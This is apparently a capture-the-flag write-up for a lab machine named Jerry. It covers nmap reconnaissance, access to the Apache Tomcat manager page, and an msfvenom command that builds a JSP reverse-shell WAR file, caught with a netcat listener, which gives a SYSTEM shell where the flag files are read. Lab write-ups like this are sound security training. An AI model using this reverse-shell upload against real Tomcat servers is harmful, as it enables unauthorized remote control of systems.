# Jerry
Some windows shit is pretty irritating, but if we're being honest, this should happen pretty damn fast.

## Recon
Just the usual, lets nmap this bitch:
```bash
nmap -A --version-light -vvv -oA jerry 10.10.10.95
Nmap scan report for 10.10.10.95
Host is up, received echo-reply ttl 127 (0.15s latency).
Scanned at 2018-07-08 14:21:44 EDT for 29s
Not shown: 999 filtered ports
Reason: 999 no-responses
PORT     STATE SERVICE REASON          VERSION
8080/tcp open  http    syn-ack ttl 127 Apache Tomcat/Coyote JSP engine 1.1
|_http-title: Site doesn't have a title.
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Microsoft Windows Server 2012 (91%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (91%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows 7 Professional (87%), Microsoft Windows 8.1 Update 1 (86%), Microsoft Windows Phone 7.5 or 8.0 (86%), Microsoft Windows 7 or Windows Server 2008 R2 (85%), Microsoft Windows Server 2008 R2 (85%), Microsoft Windows Server 2008 R2 or Windows 8.1 (85%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (85%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.70%E=4%D=7/8%OT=8080%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=5B425655%P=x86_64-pc-linux-gnu)
SEQ(SP=105%GCD=1%ISR=10D%TI=I%II=I%SS=S%TS=7)
OPS(O1=M54DNW8ST11%O2=M54DNW8ST11%O3=M54DNW8NNT11%O4=M54DNW8ST11%O5=M54DNW8ST11%O6=M54DST11)
WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000)
ECN(R=Y%DF=Y%TG=80%W=2000%O=M54DNW8NNS%CC=Y%Q=)
T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=80%CD=Z)

Uptime guess: 0.056 days (since Sun Jul  8 13:01:06 2018)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: Incremental

TRACEROUTE (using port 8080/tcp)
HOP RTT       ADDRESS
1   116.01 ms 10.10.14.1
2   197.20 ms 10.10.10.95

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jul  8 14:22:13 2018 -- 1 IP address (1 host up) scanned in 29.12 seconds
```
Alright, if we google around we'll find that the admin page is located at ```/manager/html``` navigate that way, read the 403 page and *hacker voice* we're in

## "Exploitation"
With access to tomcat, minimum effort solution is a reverse shell using a war file, conveniantly available in msfvenom:
```
msfvenom -p java/jsp_shell LHOST=someip LPORTT=6969 -f war > shell.war
Payload size: 1107 bytes
Final size of war file: 1107 bytes
```
nc -nvlp or metasploit reverse shell handler to catch that boi, upload  it and things are looking up.

## Post "exploitation"
Once we catch the reverse shell, we happen to get a system shell, so just head to the usual flag spot and it's game over. Also, I use dir a lot, fight me. Also also, the doubld quotes are key, learn from our mistakes.

```                                                                                                                          
C:\apache-tomcat-7.0.88>cd ..\Users\Administrator\Desktop\flags
                                                             
C:\Users\Administrator\Desktop\flags>dir                     
dir                                                          
 Volume in drive C has no label.                             
 Volume Serial Number is FC2B-E489                           
                                                             
 Directory of C:\Users\Administrator\Desktop\flags           
                                                             
06/19/2018  07:09 AM    <DIR>          .                     
06/19/2018  07:09 AM    <DIR>          ..                    
06/19/2018  07:11 AM                88 2 for the price of 1.txt
               1 File(s)             88 bytes                
               2 Dir(s)  27,660,591,104 bytes free           
                                                             
C:\Users\Administrator\Desktop\flags>type "2 for the price of 1.txt"
type "2 for the price of 1.txt"                              
user.txt                                                     
notarealflaghash                             
                                                             
root.txt                                                     
justfollowtheextremelysimpleinstructions                             
```
Noice,good job, team the best team.
